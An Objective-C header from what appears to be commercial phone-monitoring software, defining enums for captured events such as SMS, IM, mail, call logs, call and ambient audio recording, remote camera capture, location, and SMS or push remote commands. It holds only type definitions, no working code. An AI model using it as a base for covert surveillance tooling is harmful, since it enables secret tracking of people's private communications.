//
//  FxEventEnums.h
//  FxEvents
//
//  Created by Makara Khloth on 8/22/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

typedef enum
	{
		kEventTypeUnknown						= 0,
		kEventTypeCallLog						= 1,
		kEventTypeMail							= 2,
		kEventTypeSms							= 3,
		kEventTypeMms							= 4,
		kEventTypeIMMessage						= 5,
		kEventTypeIMContact						= 6,
		kEventTypeIMConversation				= 7,
		kEventTypeIMAccount						= 8,
		kEventTypeCameraImage					= 9,
		kEventTypeVideo							= 10,
		kEventTypeAudio							= 11,
        kEventTypeCallRecordAudio				= 12,
		kEventTypeWallpaper						= 13,
		kEventTypeAddressBook					= 14,
		kEventTypeSystem						= 15,
		kEventTypeBrowserURL					= 16,
		kEventTypeBookmark						= 17,
		kEventTypeCameraImageThumbnail			= 18,
		kEventTypeAudioThumbnail				= 19,
		kEventTypeCallRecordAudioThumbnail		= 20,
		kEventTypeVideoThumbnail				= 21,
		kEventTypeWallpaperThumbnail			= 22,
		kEventTypeLocation						= 23,
        kEventTypePanic							= 24,
		kEventTypePanicImage					= 25,
		kEventTypeSettings						= 26,
		kEventTypeIM							= 27,
		kEventTypeApplicationLifeCycle			= 28,
		kEventTypeAmbientRecordAudio			= 29,
		kEventTypeAmbientRecordAudioThumbnail	= 30,
		kEventTypeRemoteCameraImage				= 31,
		kEventTypeRemoteCameraVideo				= 32,
		kEventTypeMaxEventType
	} FxEventType;

typedef enum
	{
		kEventDirectionUnknown,
		kEventDirectionIn,
		kEventDirectionOut,
		kEventDirectionMissedCall,
		kEventDirectionLocalIM
	} FxEventDirection;

typedef enum
	{
//		kSystemEventTypeUnknown						= 0, // Obsolete
//		kSystemEventTypeGeneral						= 1, // Obsolete
		kSystemEventTypeSmsCmd						= 2,
		kSystemEventTypeSmsCmdReply					= 3,
		kSystemEventTypeNextCmd						= 4,
		kSystemEventTypeNextCmdReply				= 5,
		kSystemEventTypeSimChange					= 6,
		kSystemEventTypeBatteryInfo					= 7,
//		kSystemEventTypeDebugMessage				= 8, // Obsolete
//		kSystemEventTypeMemoryInfo					= 9, // Obsolete
		kSystemEventTypeDiskInfo					= 10,
//		kSystemEventTypeRunningProcess				= 11, // Obsolete
		kSystemEventTypeAppCrash					= 12,
//		kSystemEventTypeSignalStrength				= 13, // Obsolete
//		kSystemEventTypeDatabaseInfo				= 14, // Obsolete
//		kSystemEventTypeMediaIdNotFound				= 15, // Obsolete
//		kSystemEventTypeAppTerminated				= 16, // Obsolete
		kSystemEventTypeSimChangeNotifyHome			= 17, // Obsolete except Cyclops
		kSystemEventTypeCallNotifyHome				= 18, // Obsolete except Cyclops
		kSystemEventTypeUpdatePhoneNumberToHome		= 19,
		kSystemEventTypeMediaEventMaxSizeReached	= 20,
		kSystemEventTypePushCmd						= 21,
		kSystemEventTypePushCmdReply				= 22
	} FxSystemEventType;

typedef enum
	{
		kGPSTechUnknown,
		kGPSTechCellInfo,
		kGPSTechIntegrated,
		kGPSTechAssisted,
		kGPSTechBluetooth,
		kGPSTechNetworkBased,
		kGPSTechWifi,
		kGPSTechCellular
	} FxGPSTechType;

typedef enum
	{
		kGPSCallingModuleCoreTrigger = 1,
		kGPSCallingModulePanic	= 2,
		kGPSCallingModuleAlert	= 3,
		kGPSCallingModuleRemoteCommand	= 4,
		kGPSCallingModuleGeoStamping	= 5
	} FxGPSCallingModule;

typedef enum
	{
		kGPSProviderUnknown,
		kGPSProviderGoogle
	} FxGPSProvider;